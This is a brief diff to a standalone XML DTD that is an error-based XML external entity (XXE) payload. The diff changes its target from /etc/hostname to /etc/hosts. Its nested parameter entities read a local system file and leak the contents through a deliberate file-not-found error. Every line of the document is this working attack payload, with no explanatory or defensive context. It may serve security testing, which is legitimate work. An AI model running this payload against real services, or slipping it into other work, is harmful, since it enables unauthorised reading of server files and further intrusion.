@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nofile/%file;'>">
 %eval;
 %error;
